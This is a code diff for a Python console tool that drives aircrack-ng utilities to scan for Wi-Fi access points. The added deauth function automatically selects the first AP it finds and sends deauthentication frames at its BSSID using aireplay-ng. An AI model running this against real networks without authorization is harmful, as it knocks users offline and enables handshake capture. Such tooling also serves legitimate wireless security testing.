@@ -1,81 +1,89 @@
 import asyncio
+from contextlib import suppress
 
 from rich.console import Console
 from rich.prompt import Prompt
 
-from src.models import Startup, User, AirmonNg, AirodumpNg
+from src.models import Startup, User, AirmonNg, AirodumpNg, AireplayNg, MONITOR
 from src.models.bluetooth import HciConfig
+
+CONSOLE = Console()
+CONSOLE.clear()
+CONSOLE.show_cursor(False)
+
+
+async def monitor_interface(secret):
+    airmon = AirmonNg(secret)
+    interfaces = await airmon.interfaces
+    iface_ = Prompt.ask('Select an interface', choices=[str(a) for a in interfaces])
+    CONSOLE.print(f'Selected Interface {iface_}')
+    return airmon, iface_
 
 
 async def scan_for_targets(secret):
     """Scan for targets, return json."""
-    console = Console()
-    console.clear()
-    console.show_cursor(False)
-    airmon = AirmonNg(secret)
-    interfaces = await airmon.interfaces
+    airmon, interface = await monitor_interface(secret)
+    client = None
+    ap_ = None
 
-    # iface = [a.asdict() for a in await airmon.interfaces][0]
-    interface = Prompt.ask('Select an interface',
-                           choices=[str(a) for a in interfaces])
-    # client = None
-    # ap_ = None
-    #
-    # async with airmon(interface) as mon:
-    #     async with AirodumpNg(secret) as pdump:
-    #         # results = pdump(MONITOR.get())
-    #         # while not results:
-    #         #     results = pdump(MONITOR.get())
-    #         #     await asyncio.sleep(2)
-    #         print('here', mon.monitor_interface)
-    #         async for aps in pdump(mon.monitor_interface):
-    #             console.clear()
-    #             # console.print(aps.table)
-    #             print(aps)
-    #             client = Prompt.ask(
-    #                 'Select an AP',
-    #                 choices=['continue', *[str(a) for a in range(len(aps))]])
-    #             if client != 'continue':
-    #                 ap_ = aps[int(client)]
-    #                 break
-    #
-    #     if not ap_:
-    #         return
-    #
-    #     async with AirodumpNg(secret) as pdump:
-    #         console.print(
-    #             ":vampire:",
-    #             f"Selected client: [red] {ap_.bssid} [/red]")
-    #
-    #         async for result in pdump(MONITOR.get(), **ap_.airodump):
-    #             console.clear()
-    #             # console.print(result.table)
-    #             print(result.table)
-    #             await asyncio.sleep(3)
-    # async with airmon(iface) as mon:
-    #     async with AirodumpNg(secret) as pdump:
-    #         async for aps in pdump(mon.monitor_interface):
-    #             break
-    # print(aps)
-    # if not (ifaces := [a.interface for a in await airmon.interfaces]):
-    #     print('\nNo usable interfaces detected...')
-    #     if Prompt.ask('Please ensure your wireless NIC is detected by the system',
-    #                   choices=['RETRY', 'QUIT']) == 'RETRY':
-    #         await scan_for_targets(secret)
-    #     else:
-    #         sys.exit()
-    #
-    # interface = Prompt.ask('Select an interface', choices=ifaces)
-    #
     async with airmon(interface) as mon:
-        print(f'Monitoring mode enabled on: [{interface}]')
         async with AirodumpNg(secret) as pdump:
-            print('starting airodump')
-            async for result in pdump(mon.monitor_interface):
-                print(result)
-                console.clear()
-                console.print(result.table)
-                await asyncio.sleep(2)
+            async for aps in pdump(mon.monitor_interface):
+                CONSOLE.clear()
+                CONSOLE.print(aps.table)
+                client = Prompt.ask(
+                    'Select an AP',
+                    choices=['continue', *[str(a) for a in range(len(aps))]])
+                if client != 'continue':
+                    ap_ = aps[int(client)]
+                    break
+
+        if not ap_:
+            return
+
+        async with AirodumpNg(secret) as pdump:
+            CONSOLE.print(
+                ":vampire:",
+                f"Selected client: [red] {ap_.bssid} [/red]")
+
+            async for result in pdump(mon.monitor_interface, **ap_.airodump):
+                CONSOLE.clear()
+                CONSOLE.print(result.table)
+                await asyncio.sleep(3)
+
+
+async def deauth(secret):
+    """Scan for targets, return json."""
+    # Select first available interface matching wlp0*
+    airmon, interface = await monitor_interface(secret)
+    interface_ = await airmon.select_interface('wlp0.*')
+    ap_ = None
+
+    CONSOLE.print(f'Selected Interface {interface_}')
+
+    async with airmon(interface_):
+        await asyncio.sleep(2)
+        async with AirodumpNg(secret) as pdump:
+            async for result in pdump(MONITOR):
+                CONSOLE.print(result.table)
+                # For this example, force the first result
+                with suppress(KeyError):
+                    ap_ = result[0]
+                    CONSOLE.print('Selected AP {}'.format(ap_.bssid))
+                    break
+                await asyncio.sleep(3)
+
+    if not ap_:
+        # We didn't manage to getan AP, and somehow the process died.
+        CONSOLE.print("No APs available")
+        return
+
+    # Change channel with airmon-ng
+    async with airmon(interface_, ap_.channel):
+        async with AireplayNg(secret) as aireplay:
+            async for res in aireplay(MONITOR, deauth=10, D=True, b=ap_.bssid):
+                CONSOLE.print(res.table)
+                await asyncio.sleep(3)
 
 
 async def main():
@@ -83,9 +91,6 @@ async def main():
         Startup()
         user = User()
         with user.secret() as sec:
-            # hci = HciConfig(sec)
-            # results = await hci.get_result()
-            # print(results)
             await scan_for_targets(sec)
 
 
